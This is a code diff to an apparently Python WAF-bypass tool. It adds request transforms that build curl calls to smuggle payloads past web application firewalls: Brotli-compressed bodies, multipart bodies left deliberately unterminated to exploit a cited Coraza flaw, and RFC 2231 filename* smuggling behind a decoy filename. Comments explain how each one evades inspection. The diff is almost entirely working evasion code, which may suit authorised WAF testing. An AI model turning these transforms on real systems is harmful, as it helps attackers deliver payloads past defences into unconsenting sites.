@@ -16,6 +16,7 @@ import urllib.parse
 from dataclasses import dataclass
 from typing import Callable, Optional
 
+from .brotli_raw import compress_stored
 from .oracle import Target
 
 
@@ -24,9 +25,17 @@ class RequestTransform:
     name: str
     desc: str
     _build: Callable[[Target, str], Optional[list]]
+    # Optional: bytes to feed curl on stdin (for binary bodies that can't ride in
+    # argv, e.g. a Brotli stream with NUL bytes). When set, the argv uses
+    # `--data-binary @-` and the Oracle pipes these bytes per request — pure and
+    # concurrency-safe, no temp files. See Oracle._curl_send.
+    stdin_fn: Optional[Callable[[Target, str], bytes]] = None
 
     def build(self, target: Target, payload: str):
         return self._build(target, payload)
+
+    def stdin(self, target: Target, payload: str) -> Optional[bytes]:
+        return self.stdin_fn(target, payload) if self.stdin_fn is not None else None
 
 
 def _base(t: Target) -> list[str]:
@@ -105,6 +114,25 @@ def _charset_header(t: Target, payload: str):
     return _base(t) + ["-X", "POST", _url(t),
                        "-H", "Content-Type: application/x-www-form-urlencoded; charset=ibm037",
                        "--data-binary", body]
+
+
+def _brotli_body(t: Target, payload: str):
+    # Body compressed with Content-Encoding: br. Many WAFs decompress only gzip/
+    # deflate request bodies (or none), so a br body sails past content inspection
+    # while a br-decoding backend still processes it — the compression blind spot
+    # the Brotli "Node2Shell" work (CVE-2026-111497) turns into a decoder-reachability
+    # primitive. The br stream has NUL bytes, so it can't ride in argv: the argv
+    # says `--data-binary @-` and the actual bytes are piped on stdin (stdin_fn).
+    return _base(t) + ["-X", "POST", _url(t),
+                       "-H", "Content-Type: application/x-www-form-urlencoded",
+                       "-H", "Content-Encoding: br",
+                       "--data-binary", "@-"]
+
+
+def _brotli_stdin(t: Target, payload: str) -> bytes:
+    # the exact bytes for _brotli_body's `@-`: brotli(urlencode(param=payload)).
+    body = urllib.parse.urlencode({t.param: payload}).encode()
+    return compress_stored(body)
 
 
 def _junk_prefix_param_build(t: Target, payload: str, size: int):
@@ -199,6 +227,37 @@ def _mp_boundary_whitespace(t: Target, payload: str):
                        "--data-binary", body]
 
 
+def _mp_truncated(t: Target, payload: str):
+    # Truncated multipart: NO closing --boundary-- and no trailing CRLF. A
+    # vulnerable Coraza (<=3.8.0, CVE-2026-41508) hits io.ErrUnexpectedEOF,
+    # treats it as benign, never raises MULTIPART_STRICT_ERROR (rules 200002/
+    # 200003 stay silent) and drops the part — while tolerant backend parsers
+    # still extract the field. A pure parser-fail-open differential.
+    b = "----WAFFENb0undary"
+    body = (f"--{b}\r\n"
+            f'Content-Disposition: form-data; name="{t.param}"\r\n\r\n'
+            f"{payload}")  # intentionally unterminated: no trailing \r\n--{b}--
+    return _base(t) + ["-X", "POST", _url(t),
+                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
+                       "--data-binary", body]
+
+
+def _mp_filename_rfc2231(t: Target, payload: str):
+    # RFC 2231 extended parameter: the WAF inspects the plain filename="decoy.txt"
+    # and misses the payload carried (percent-encoded) in filename*=UTF-8''...,
+    # which RFC 2231-aware backends decode and honour (CVE-2026-104269).
+    b = "----WAFFENb0undary"
+    enc = urllib.parse.quote(payload, safe="")
+    body = (f"--{b}\r\n"
+            f'Content-Disposition: form-data; name="{t.param}"; '
+            f"filename=\"decoy.txt\"; filename*=UTF-8''{enc}\r\n"
+            f"Content-Type: application/octet-stream\r\n\r\n"
+            f"{payload}\r\n--{b}--\r\n")
+    return _base(t) + ["-X", "POST", _url(t),
+                       "-H", f"Content-Type: multipart/form-data; boundary={b}",
+                       "--data-binary", body]
+
+
 def _xml_body(t: Target, payload: str):
     esc = (payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
     body = f'<?xml version="1.0"?><root><{t.param}>{esc}</{t.param}></root>'
@@ -232,6 +291,8 @@ TRANSFORMS: list[RequestTransform] = [
     RequestTransform("content_type_confusion", "urlencoded bytes labelled as JSON", _content_type_confusion),
     RequestTransform("verb_override", "PUT + X-HTTP-Method-Override", _verb_override),
     RequestTransform("charset_header", "exotic charset in Content-Type", _charset_header),
+    RequestTransform("brotli_body", "Content-Encoding: br body (WAF br-decompression blind spot, CVE-2026-111497)",
+                     _brotli_body, stdin_fn=_brotli_stdin),
     RequestTransform("junk_prefix_param", "huge benign param before payload", _junk_prefix_param),
     # D2 structural / parser-differential (WAFFLED split-brain)
     RequestTransform("json_dup_key", "duplicate JSON key (last-wins differential)", _json_dup_key),
@@ -241,12 +302,15 @@ TRANSFORMS: list[RequestTransform] = [
     RequestTransform("mp_dup_disposition", "multipart: two Content-Disposition lines", _mp_dup_disposition),
     RequestTransform("mp_filename_confusion", "multipart: name + filename on one part", _mp_filename_confusion),
     RequestTransform("mp_boundary_whitespace", "multipart: trailing space in boundary", _mp_boundary_whitespace),
+    RequestTransform("mp_truncated", "multipart truncated before closing boundary (Coraza CVE-2026-41508)", _mp_truncated),
+    RequestTransform("mp_filename_rfc2231", "multipart RFC 2231 filename* smuggling (CVE-2026-104269)", _mp_filename_rfc2231),
     RequestTransform("xml_body", "payload inside an XML element", _xml_body),
     RequestTransform("graphql_body", "minimal GraphQL query+variables envelope", _graphql_body),
 ]
 # transforms that reshape the request STRUCTURE (parser-differential), a distinct axis
 STRUCTURAL = {"json_dup_key", "json_unicode_key", "json_array_wrap", "json_nested_junk",
-              "mp_dup_disposition", "mp_filename_confusion", "mp_boundary_whitespace", "xml_body"}
+              "mp_dup_disposition", "mp_filename_confusion", "mp_boundary_whitespace", "xml_body",
+              "mp_truncated", "mp_filename_rfc2231"}
 
 # extra placeholder wire-formats that aren't parser-differential tricks (not
 # STRUCTURAL) — just new envelope shapes some WAF rule sets inspect less
